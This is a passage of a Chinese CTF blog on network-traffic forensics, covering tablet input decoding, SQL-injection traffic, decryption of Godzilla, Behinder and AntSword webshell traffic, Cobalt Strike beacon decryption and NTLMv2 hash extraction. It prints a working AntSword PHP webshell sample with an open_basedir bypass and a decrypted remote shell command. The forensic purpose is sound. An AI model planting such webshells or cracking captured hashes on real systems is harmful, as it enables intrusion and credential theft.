class="line">08813c08951e440200000000</span><br><span class="line">08813c08951e610200000000</span><br></pre></td></tr></table></figure>
<p>第二个字节代表了是否启用0x81位有效坐标，同时后四位还有数位板的压感值。</p>
<p>当第二字节为0x81时，说明数位板正在作画，且第8字节和第9字节存在压感值，当第二字节为0x80时，说明数位板没有落笔，即没有作画，此时第8字节和第9字节不存在压感，为0x0000。</p>
<p>坐标分析直接说结论，第5-8位是x轴坐标，第9-12位是y轴坐标，并且是小端序储存方法。</p>
<p>例如：</p>
<p>08803708951e000000000000这个数据，0x3708是x坐标信息，0x951e是y坐标信息，但是由于数据为小端序储存，实际x坐标为0x0837，y坐标为0x1e95。</p>
<p>分析数据，分为压感和低压感的数据，直接用CTFD中的脚本跑出坐标并画图</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数位板压感数据分析.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(line[<span class="number">12</span>:<span class="number">16</span>], <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>) + <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>) * <span class="number">0xff</span></span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">8</span>:<span class="number">10</span>], <span class="number">16</span>) + <span class="built_in">int</span>(line[<span class="number">10</span>:<span class="number">12</span>], <span class="number">16</span>) * <span class="number">0xff</span></span><br><span class="line">    result.write(<span class="built_in">str</span>(x)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(-y)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数位板低压感数据分析.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(line[<span class="number">12</span>:<span class="number">16</span>], <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>) + <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>) * <span class="number">0xff</span></span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">8</span>:<span class="number">10</span>], <span class="number">16</span>) + <span class="built_in">int</span>(line[<span class="number">10</span>:<span class="number">12</span>], <span class="number">16</span>) * <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(line[<span class="number">12</span>:<span class="number">16</span>], <span class="number">16</span>) &lt; <span class="number">0xf000</span>:</span><br><span class="line">        result.write(<span class="built_in">str</span>(x)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(-y)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure>
<h5 id="SQL注入流量分析">SQL注入流量分析</h5>
<p>可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组</p>
<p>然后使用 tshark 根据字段名提取出所有的注入语句</p>
<p>如果是盲注的话，直接写个正则匹配脚本提取数据即可</p>
<p>例题1-2023 铁三 traffic</p>
<h4 id="Webshell流量分析">Webshell流量分析</h4>
<p>Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip数据一般是以 1F 8B 08 00 开头的</p>
<h5 id="菜刀流量分析">菜刀流量分析</h5>
<p>在TCP和HTTP协议中寻找线索，找返回包中一大串的数据，并根据标志位判断文件类型<br>
如果是加密了的压缩包，看看是不是伪加密</p>
<h5 id="哥斯拉流量分析">哥斯拉流量分析</h5>
<p>3.03版本</p>
<p>哥斯拉的连接需要填写密码和密钥，加密过程中使用的是密钥MD5的前16位</p>
<p><strong>Request解密脚本</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;&#x27;</span>)),<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">//有时候Request解密也需要gzdecode</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;&#x27;</span>)), <span class="variable">$key</span>));</span><br></pre></td></tr></table></figure>
<p><strong>Response解密脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++)&#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pass=&#x27;pass&#x27;;</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class="line">// 原来的数据去掉前十六位和后十六位然后解密</span><br><span class="line">echo gzdecode(encode(base64_decode(&#x27;DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#x27;),$key));</span><br></pre></td></tr></table></figure>
<p><strong>解密的例子</strong></p>
<p>request解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;DlMRWA1cL1gOVDc%2FMjRhVAZCJ1ERUQJKKl9TXQ%3D%3D&#x27;</span>)), <span class="variable">$key</span>);</span><br><span class="line"><span class="comment">//getBasicsInfo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;fL1tMGI4YTljMSj8jz6jA3d2hOK3r9ldE1qWHCQw5iUyciHYwoApdQ2q4%2B6UwuZnokGyih%2BkiHExtpdwzdcYbcgX9fDGOqekEG0dGJhlwPAYnbSoMmLbfNCAAOREiM6%2BdrzW5dmQQHmrvf3x40sVcGT3bOqpDSpn2IV5%2FP0YvGN9oTSJH9QUJk5U6Ro0v5RHLe4Mm%2By6saafb0Vyq2xDYsoZK0TfoMI5YzE%3D&#x27;</span>)), <span class="variable">$key</span>));</span><br><span class="line"><span class="comment">/**cmdLine&#125;sh -c &quot;cd &quot;/www/admin/www.webshell.com_80/wwwroot/upload/&quot;;zip -e flag.zip flag.txt -P sXZfCyHSjCWqfSSEmgBj8jGkJhu87cBrd&quot; 2&gt;&amp;1methodName</span></span><br><span class="line"><span class="comment">execCommand**/</span></span><br></pre></td></tr></table></figure>
<p>Response解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;fL1tMGI4YTljMn75e3i2GMoehBqscKzwshr9GtI2YQRVyPwjYjhh&#x27;</span>)), <span class="variable">$key</span>));</span><br><span class="line"><span class="comment">//flag.txt shell.php</span></span><br></pre></td></tr></table></figure>
<h5 id="冰蝎流量分析">冰蝎流量分析</h5>
<p>简要加密过程（请求）</p>
<p>base64 -&gt; AES(key = ？？？ IV = 0123456789abcdef) -&gt; base64<br>
有时候 IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>
简要解密过程（响应）</p>
<p>解密过程反过来即可</p>
<p>从流量包中的HTTP数据包中获取key和data，然后用CyberChef解密即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N2.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N3.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N4.png"
                        alt=""
                 ></p>
<p>这里如果想要偷懒，对于冰蝎和哥斯拉流量可以直接用 风二西 师傅的 承影_哥斯拉冰蝎解码工具 一把梭了</p>
<p>直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N5.png"
                        alt=""
                 ></p>
<h5 id="蚁剑流量分析">蚁剑流量分析</h5>
<p>蚁剑流量分析需要注意的地方：</p>
<p>1、路径base64字符串需要去除前两个字符后再解码</p>
<p>2、响应数据的头尾有额外的字符，需要先去除然后再base64解码</p>
<p>蚁剑webshell样本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置一些PHP配置</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭显示错误信息</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间为无限制</span></span><br><span class="line"><span class="comment">// 获取open_basedir配置</span></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="comment">// 如果open_basedir配置存在</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取当前脚本所在目录</span></span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="comment">// 将open_basedir路径分割成数组</span></span><br><span class="line">    <span class="comment">// /;|:/</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>);</span><br><span class="line">    <span class="comment">// 将当前目录和系统临时目录添加到数组中</span></span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">    <span class="comment">// 遍历open_basedir数组</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果目录不可写，继续下一个目录</span></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建一个临时目录</span></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.573ef8c9dd12&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="comment">// 如果目录创建失败，继续下一个目录</span></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取临时目录的真实路径</span></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="comment">// 切换到临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="comment">// 修改open_basedir配置，使其可以访问上层目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取目录路径的数组</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="comment">// 逐级返回上层目录，以还原open_basedir配置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 恢复open_basedir配置为根目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="comment">// 删除临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="comment">// 跳出循环，只操作第一个可写目录</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义函数，对输出进行base64编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义函数，获取输出缓冲区内容并进行处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line">    <span class="comment">// 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fb708664&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;870b983ed5&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开始输出缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 解码POST请求中的文件路径和内容</span></span><br><span class="line">    <span class="comment">// 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在</span></span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;idb82191cedb24&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;e748c4dcd196bb&quot;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// 将内容进行URL解码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$buf</span> .= <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将解码后的内容写入文件，并返回结果</span></span><br><span class="line">    <span class="keyword">echo</span> (@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>, <span class="string">&quot;a&quot;</span>), <span class="variable">$buf</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果发生异常，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用自定义函数处理输出</span></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里总结一下我手动分析蚁剑流量的步骤：</p>
<p>1、首先url解码请求包，然后base64解码其中的php文件和该文件执行的命令</p>
<p>2、找到php文件中asoutput函数的标识字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line">    <span class="comment">// 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fb708664&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;870b983ed5&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3、根据gzip的文件头提取响应包，去除标识字符串后base64解码得到响应数据</p>
<p>4、按照上面的步骤逐个分析流量包</p>
<h5 id="CobalStrike流量分析">CobalStrike流量分析</h5>
<p>先从流量包中导出key文件</p>
<p>然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r</span><br><span class="line">To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh</span><br><span class="line">Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC</span><br><span class="line">gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V</span><br><span class="line">r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW</span><br><span class="line">vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL</span><br><span class="line">3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp</span><br><span class="line">v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG</span><br><span class="line">9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C</span><br><span class="line">dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB</span><br><span class="line">AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2</span><br><span class="line">ddsyNI6XbCU=</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie</p>
<p>运行即可得到 AES和HMAC key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AES key:ef08974c0b06bd5127e04ceffe12597b</span><br><span class="line">HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9</span><br></pre></td></tr></table></figure>
<p>然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中</p>
<p>把流量包中的POST数据包中的data的值用CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中</p>
<p>一个个解密每个POST数据包中的data即可得到flag</p>
<h4 id="NTLM流量分析">NTLM流量分析</h4>
<p>NTLM流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包</p>
<p>可以用关键字 ntlmssp 过滤流量包，然后看每个流量包右侧的 info 栏快速定位NTLM信息的位置</p>
<h4 id="提取-NTLMv2-哈希值并破解（SMB协议）">提取 NTLMv2 哈希值并破解（SMB协议）</h4>
<p>首先，使用关键字 ntlmssp 对流量包进行筛选并定位到认证成功的 NTLMSSP_AUTH 包<br>
打开流量包中的 Security Blob 层<br>
复制用户名、域名</p>
<p>然后，分析NTLM响应部分，找到NTProofStr字段和NTLMv2的响应，将它们作为十六进制字符串复制到文本文档中<br>
NTLMv2 Response是从ntlmProofStr开始，因此从NTLMv2的响应中要删除ntlmProofStr。</p>
<p>最后，在过滤器中输入ntlmssp.ntlmserverchallenge，查找NTLM Server Challenge字段，通常这个数据包是在NTLM_Auth数据包之前，将该值作为十六进制字符串复制到文本文档。</p>
<p>把上面三部分的参数按以下格式保存到hash.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br></pre></td></tr></table></figure>
